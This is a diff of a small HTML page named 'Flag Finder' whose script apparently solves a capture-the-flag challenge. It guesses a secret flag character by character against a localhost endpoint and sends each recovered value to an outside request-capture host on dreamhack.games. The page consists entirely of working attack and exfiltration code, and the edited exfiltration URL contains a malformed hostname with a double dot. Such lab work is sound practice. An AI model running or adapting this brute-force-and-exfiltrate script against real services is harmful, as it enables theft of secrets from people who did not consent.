@@ -6,7 +6,7 @@
     <title>Flag Finder</title>
 </head>
 <body>
-    <h1>Flag Finder4</h1>
+    <h1>Flag Finder5</h1>
     <script>
         let server_flag = ''; // 전역 변수
 
@@ -18,17 +18,20 @@
 
                 for (let i = 32; i <= 127; i++) {
                     const flag = server_flag + String.fromCharCode(i); // 수정된 부분
-                    const requestUrl = `https://localhost/flag?flag=${encodeURIComponent(server_flag + flag)}`;
+                    const requestUrl = `https://localhost/flag?flag=${encodeURIComponent(flag)}`;
 
                     const response = await fetch(requestUrl);
                     const text = await response.text();
 
+                    console.log(`Requesting: ${requestUrl}`); // 요청 로그
+                    console.log(`Response: ${text}`); // 응답 로그
+
                     if (text === 'good try') {
-                        server_flag += flag; // 해당 문자를 추가
+                        server_flag += String.fromCharCode(i); // 해당 문자를 추가
                         console.log(`Current FLAG: ${server_flag}`);
 
                         // 최종 FLAG로 요청 보내기 (응답 기다리지 않음)
-                        const finalRequestUrl = `https://qppbgwj.request.dreamhack.games?flag=${encodeURIComponent(server_flag)}`;
+                        const finalRequestUrl = `https://wyupgdf..request.dreamhack.games?flag=${encodeURIComponent(server_flag)}`;
                         fetch(finalRequestUrl); // 응답을 기다리지 않고 요청만 보냄
 
                         found = true; // FLAG를 찾았으므로 true로 설정
